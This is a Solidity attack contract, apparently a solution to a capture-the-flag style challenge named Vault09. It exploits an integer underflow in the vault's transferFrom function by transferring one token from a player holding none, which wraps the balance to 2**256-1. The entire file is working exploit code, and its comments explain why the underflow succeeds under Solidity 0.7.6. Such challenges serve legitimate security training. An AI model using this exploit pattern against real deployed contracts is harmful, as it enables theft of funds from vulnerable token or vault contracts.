// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

/**
 * @title Interface for Vault09 contract
 */
interface IVault09 {
    function transferFrom(address from, address to, uint256 amount) external;
}

/**
 * @title Attack contract for Vault09
 * @notice Exploits an integer underflow vulnerability in Vault09's transferFrom function
 */
contract Vault09Attack {
    // Reference to the vulnerable vault contract
    IVault09 public vault;
    // Address of the player who deployed this contract
    address immutable playerAddress;
    
    /**
     * @param _vaultAddress The address of the vulnerable Vault09 contract
     */
    constructor(address _vaultAddress) {
        vault = IVault09(_vaultAddress);
        playerAddress = msg.sender;
    }
    
    /**
     * @notice Performs the attack by triggering an underflow in the vault contract
     * @dev This exploit works because Solidity 0.7.6 doesn't have default overflow/underflow protection
     */
    function attack() external {      
        // Transfer 1 token from player that has 0 tokens 
        // The player amount will underflow and become 2**256 - 1
        vault.transferFrom(playerAddress, address(this), 1);
    }
}

